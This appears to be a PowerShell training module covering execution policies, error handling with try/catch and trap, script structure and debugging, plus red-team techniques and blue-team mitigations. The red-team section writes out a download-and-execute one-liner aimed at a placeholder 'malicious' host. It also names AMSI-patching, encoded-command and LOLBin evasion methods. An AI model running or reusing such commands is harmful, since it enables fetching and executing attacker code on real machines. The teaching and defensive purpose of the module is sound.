# 🔐🛡️ Day 4 – Execution Policy, Error Handling & Debugging

*Module 02 — PowerShell | Day 4*

---

## 🎯 Learning Objectives

- Understand PowerShell execution policies
- Handle errors with `try`/`catch`/`finally`
- Structure and debug PowerShell scripts
- Work with PowerShell remoting

---

# Day 4 – PowerShell 🔐🛡️
### Execution Policy, Error Handling, Script Structure, Debugging, and PowerShell Security

> **Today is about defensive posture, script safety, and catching errors before they catch you.**

## 🎯 Terminal Learning Objectives

At the end of this module, you will be able to:
- Understand PowerShell Execution Policies and their security roles
- Use `try`, `catch`, `trap`, and `$ErrorActionPreference` for error handling
- Write properly structured and reusable PowerShell scripts
- Debug scripts using built-in tools
- Analyze and understand PowerShell’s role in Red/Blue team operations
- Identify ways PowerShell is abused and how to mitigate it

## 🔐 What is an Execution Policy?

Execution Policy is a built-in safety feature to **control how scripts are run** in PowerShell.

**Important**: Execution Policy is **not** a true security feature. It’s more like a first line of defense or **“policy enforcement with a warning.”**

### Types of Execution Policies:

| Policy         | Description |
|----------------|-------------|
| `Restricted`   | Default for Windows PowerShell. No scripts allowed to run. |
| `AllSigned`    | Requires all scripts (even local) be signed by a trusted publisher. |
| `RemoteSigned` | Local scripts run fine. Scripts from the internet must be signed. |
| `Unrestricted` | You can run anything, but there’s a warning for remote content. |
| `Bypass`       | Nothing is blocked. No warnings. This is useful for automation. |
| `Undefined`    | No policy is set at that level. Falls back to group or default. |

```powershell
# Check the current execution policy for this session:
Get-ExecutionPolicy
```

```powershell
# Check all execution policies at every scope (LocalMachine, User, etc.):
Get-ExecutionPolicy -List
```

### 🔄 Setting an Execution Policy
**ALWAYS** use `-Scope` to avoid globally changing the policy unless absolutely necessary.

```powershell
# Set to RemoteSigned just for current user:
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
```

> 🔍 **Pro Tip:** Execution Policy can be overridden by launching PowerShell with `-ExecutionPolicy Bypass`.

## ❌ Error Handling in PowerShell
PowerShell can throw both **terminating** and **non-terminating** errors. Handling them correctly is critical for defensive scripting and automation.

### 🔁 Try / Catch
- Only works with **terminating** errors.
- Use `-ErrorAction Stop` to make non-terminating errors catchable.
- `$_.Exception.Message` gives detailed error info.

```powershell
try {
    Get-Item -Path "C:\nonexistent.txt" -ErrorAction Stop
} catch {
    Write-Host "❗Caught error: $($_.Exception.Message)"
}
```

### 🧱 Trap Blocks
- Useful for **older scripts** and general-purpose error trapping.
- Automatically resumes if not told to `break`, `continue`, or `exit`.

```powershell
trap {
    Write-Host "🔥 Trap caught: $($_.Exception.Message)"
    continue
}
Get-Item 'Z:\Nope.txt' -ErrorAction Stop
```

## 🔧 `$ErrorActionPreference`
Use this variable to control error behavior **globally** in a script.

**Values:** `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`

```powershell
$ErrorActionPreference = 'Stop'
Get-Item "C:\definitely-not-here.txt"
```

## ✅ Did it Work? `$?` and `$LASTEXITCODE`
- `$?` shows **True/False** for the **last command**.
- `$LASTEXITCODE` gives numeric return value for **native executables** (like `ping`).

```powershell
Get-Process explorer
$?
$LASTEXITCODE
```

```powershell
ping 127.0.0.1 -n 1
$?
$LASTEXITCODE
```

## 📜 PowerShell Script Structure
A well-structured script is easier to debug, maintain, and defend.
Your script should flow like a clean document — **from purpose to action.**

### 📘 Recommended Structure
1. Metadata header
2. Parameters
3. Variables
4. Main logic
5. Output
6. Functions (modular support)

> 🧠 The more readable your script, the harder it is to weaponize silently.

```powershell
<#
Name: Get-NetworkSnapshot.ps1
Author: BlueTeam
Purpose: Dump current listening ports and optional firewall rules
#>

param(
    [switch]$IncludeFirewall
)

$timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
$output = "netinfo_$timestamp.txt"

Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'} |
Select-Object LocalAddress, LocalPort, OwningProcess |
Out-File -FilePath $output

if ($IncludeFirewall) {
    Get-NetFirewallRule | Out-File -Append -FilePath $output
}
```

## 🧰 Script Repurposing Techniques
Attackers — and clever defenders — often reuse existing PowerShell scripts.
This can speed up development, but it can also **hide malicious intent.**

### 🕵️‍♂️ Common Repurposing Techniques:
- Rename script files (e.g., `report.ps1` instead of `recon.ps1`)
- Strip out author/metadata block
- Use built-in cmdlets for unintended purposes (e.g., `Get-Process` for enumeration)
- Combine multiple modules or functions from public repos
- Encode content with Base64 or obfuscate variables
- Remove inline comments to avoid detection

> ⚠️ If you're on a Blue Team: Always review scripts for hidden or dual-use logic. Especially in scheduled tasks or login scripts.

## 🐞 Debugging PowerShell Scripts
Debugging is not just for developers — it’s essential for analysts and defenders too.

**PowerShell Debug Tools:**
- `Write-Debug`, `Write-Verbose`, `Write-Host`, `Write-Output`
- `Set-PSBreakpoint`, `Get-PSCallStack`, `Enable-PSBreakpoint`
- Visual breakpoints in VS Code

```powershell
Write-Debug "🔍 Debug info" -Debug
Write-Verbose "Verbose logging enabled" -Verbose
Write-Host "This always shows up in the terminal"
```

```powershell
Set-PSBreakpoint -Command Get-Service
```

## ⚔️ PowerShell Offensive Use Cases (Red Team)
PowerShell is often used in post-exploitation, lateral movement, and fileless malware.

### ⚠️ Real-World Techniques:
- In-memory malware using `System.Reflection`
- Download+Execute: `IEX (New-Object Net.WebClient).DownloadString('http://malicious')`
- Obfuscation with variables, aliases, and Base64
- Leveraging LOLBins: `regsvr32.exe`, `mshta.exe`, `rundll32.exe`, `powershell.exe`
- Bypassing AMSI with memory patching or reflection

## 🛡️ Defensive Use Cases (Blue Team)
PowerShell is also **one of the most powerful defensive tools** available.

**Use Cases:**
- Live memory or log analysis
- Scripted incident response workflows
- Scheduled forensic captures
- Baseline comparisons of services/users
- Real-time SIEM integration using REST APIs or file drops

## 🧱 Mitigations for PowerShell Abuse
**You can harden PowerShell without disabling it entirely.**

**Top Mitigations:**
- Use `ConstrainedLanguageMode`
- Disable PowerShell v2 (legacy risk)
- Enforce `AppLocker` rules
- Enable deep script block logging (Event ID 4104)
- Use `Windows Defender AMSI` + SIEM alerts

```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

**Known Evasion Methods:**
- Base64-encoded `-EncodedCommand` payloads
- Memory-only payloads via reflection
- AMSI patching (`[Ref].Assembly.GetType(...)`)
- Fileless malware leveraging PowerShell and WMI/CIM

## ✅ Summary
- Use execution policies wisely
- Trap and handle your errors
- Structure your scripts cleanly
- Learn to debug before deploying
- Recognize when PowerShell is helping... or hurting


---

[⬆️ Back to Module Index](../README.md)
